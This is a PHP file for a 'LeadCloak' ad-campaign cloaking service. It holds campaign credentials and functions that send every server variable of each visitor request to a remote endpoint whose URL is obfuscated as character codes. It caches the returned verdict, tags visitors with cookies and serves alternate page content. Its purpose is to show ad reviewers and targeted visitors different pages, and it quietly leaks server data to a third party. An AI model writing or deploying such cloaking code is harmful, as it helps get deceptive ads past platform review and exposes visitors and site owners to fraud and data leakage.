<?php
/**
 * Campaign: ConnieCAtwood2323
 * Created: 2022-02-20 11:12:36 UTC
 */

// ---------------------------------------------------
// Configuration

$campaignId = '16r6gl82xie9';

$campaignSignature = 'TbN0guVjV8DHUoUW2yp8wJT8pDyYaQ8auRw68HGRga0UrnA8Hw';

// ---------------------------------------------------
// DO NOT EDIT

function httpHandleResponse($response, $logToFile = true)
{
	$decodedResponse = json_decode( $response, true );

	if (is_array($decodedResponse) && array_key_exists('error', $decodedResponse)) {
		if ($logToFile) {
			logToFile( $decodedResponse['error'] . ' ' . $decodedResponse['message']);
		}
		header($_SERVER['SERVER_PROTOCOL']." ".$decodedResponse['error'] ." ".$decodedResponse['message']);
	} else {
		$currentURI = (!empty($_SERVER['HTTPS']) ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

        file_put_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'16r6gl82xie9', $response);

        if (!httpTaggedUser() && ($decodedResponse[6] > 0)) {
            httpTagUser($decodedResponse[6], $decodedResponse[4]);
        }

		if ($decodedResponse[0] != $currentURI) {
			print($response);
		}
	}
}

function httpRequestMakePayload($campaignId, $campaignSignature, array $postData)
{
    if (!array_key_exists('q', $postData))
    {
        return $postData;
    }

    $postData = $postData['q'];

    $payload = preg_split('@\|@',base64_decode($postData));

    $payload[1] = $campaignSignature;

	$payload[28] = 'pisccl40';
	$payload[29] = '0';

    return base64_encode(implode('|',$payload));
}

function httpRequestExec($metadata)
{
    if (httpTaggedUser() && file_exists(sys_get_temp_dir().DIRECTORY_SEPARATOR.'16r6gl82xie9'))
    {
        return file_get_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'16r6gl82xie9');
    }

    $headers = httpGetAllHeaders();

    $ch = httpRequestInitCall();

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'q='.$metadata);

    curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);

    $http_response = curl_exec($ch);

	$http_status = curl_getinfo( $ch );
	$http_code   = $http_status['http_code'];

	if ( $http_code != 200 ) {
		switch ( $http_code ) {
			case 400:
				$message = 'Bad Request';
			break;

			case 402:
				$message = 'Payment Required';
			break;

			case 417:
				$message = 'Expectation Failed';
			break;

			case 429:
				$message = 'Request Throttled';
			break;

			case 500:
				$message = 'Internal Server Error';
			break;

			default:
				$message = '';
			break;
		}
		$http_response = json_encode( [ 'error' => $http_code, 'message' => $message ] );
	}

    curl_close($ch);

    return $http_response;
}

function httpGetHeaders()
{
    $h = ['HTTP_REFERER' => '', 'HTTP_USER_AGENT' => '', 'SERVER_NAME' => '', 'REQUEST_TIME' => '', 'QUERY_STRING' => ''];

    while(list($key, $value) = each($h))
    {
        $h[$key] = array_key_exists($key, $_SERVER) ? $_SERVER[$key] : $value;
    }

    return $h;
}

function httpGetAllHeaders()
{
	$headers = [];

	foreach ($_SERVER as $header => $value)
	{
		$key       = 'X-LC-' . str_replace('_', '-', $header);
		$value     = is_array($value) ? implode(',', $value) : $value;
		$headers[] = $key . ':' . trim($value);
	}

	$headers[] = 'X-LC-SIG: TbN0guVjV8DHUoUW2yp8wJT8pDyYaQ8auRw68HGRga0UrnA8Hw';

	return $headers;
}

function httpRequestInitCall()
{
	$s = [104,116,116,112,115,58,47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111, 47, 101, 47 ];

    $u = '';
    foreach($s as $v) { $u .=chr($v); }
    $u .= '16r6gl82xie9';

    return curl_init($u);
}

function httpGetIPHeaders ($returnList = false)
{
    if (array_key_exists('HTTP_FORWARDED', $_SERVER))
    {
        return str_replace('@for\=@', '', $_SERVER['HTTP_FORWARDED']);
    }
    else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER))
    {
        $ipList = array_values(array_filter(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])));

        if (sizeof($ipList) == 1)
        {
            return current($ipList);
        }

        if ($returnList)
        {
            return $ipList;
        }

        foreach ($ipList as $ip)
        {
            $ip = trim($ip);

            /**
             * check if the value is anything other than an IP address
             */
            if ( ! httpIsValidIP($ip))
            {
                continue;
            }
        }
    }
    else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER))
    {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    else if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER))
    {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    else if (array_key_exists('REMOTE_ADDR', $_SERVER))
    {
        return $_SERVER["REMOTE_ADDR"];
    }

    return false;
}

function httpIsValidIP($ipAddress)
{
    return (bool) filter_var($ipAddress, FILTER_VALIDATE_IP);
}

function httpTaggedUser()
{
    return array_key_exists('16r6gl82xie9', $_COOKIE) ? $_COOKIE['16r6gl82xie9'] : 0 ;
}

function httpTagUser($type, $life)
{
    setcookie('16r6gl82xie9', $type, time() + $life * 60 * 60 * 24, '/');
}

function isPost()
{
    return $_SERVER['REQUEST_METHOD'] == 'POST' ? true : false;
}

function isPHPVersionAcceptable() {
	if (PHP_MAJOR_VERSION == 5 && PHP_MINOR_VERSION < 4) {
		return 'Please update your PHP Version to PHP 5.4 or higher to use this application.';
	}

	return true;
}

function isCURLInstalled() {
	if (!in_array('curl',get_loaded_extensions())) {
		return 'This application requires that cURL be installed. Please install cURL to continue.';
	}

	return true;
}
function isJSONInstalled() {
	if (!function_exists('json_encode')) {
		return 'This application requires that the PHP be able to decode JSON. Please enable a JSON for PHP.';
	}

	return true;
}

function isDirectoryWritable() {
	if (!is_readable(dirname(__FILE__))) {
		return 'This application requires to be able to read to this directory for logging purposes. Please change permissions for this directory ('.(dirname(__FILE__)).') to continue.';
	}

	if (!is_writeable(dirname(__FILE__))) {
		return 'This application requires to be able to write to this directory for logging purposes. Please change permissions for this directory ('.(dirname(__FILE__)).') to continue.';
	}

	return true;
}

function isApplicationReadyToRun() {
	print 'Checking application environment...'.nl2br(PHP_EOL);
	$checks = [ isPHPVersionAcceptable(), isCURLInstalled(), isJSONInstalled(), isDirectoryWritable() ];
	$hasErrors = false;

	foreach($checks as $check) {
		if (!is_bool($check)) {
			$hasErrors = true;

			print ' - '.$check.nl2br(PHP_EOL);
		}
	}

	if (empty($hasErrors)) {
		print 'App ready to run!'.nl2br(PHP_EOL).'Set `$enableDebugging` to `false` to continue.';
	}

	die();
}

function logToFile($result)  {
	$date     = date('Y-m-d H:i:s.u');
	$filename = 'leadcloak-log-16r6gl82xie9.log';

	$contents = "[{$date}] Failed: {$result} " . PHP_EOL;

	if (file_exists($filename) && !is_writable($filename))
	{
		// ERROR
		return 'Error writing to log file';
	}

	return file_put_contents($filename, $contents, FILE_APPEND) ? true : false;
}
?>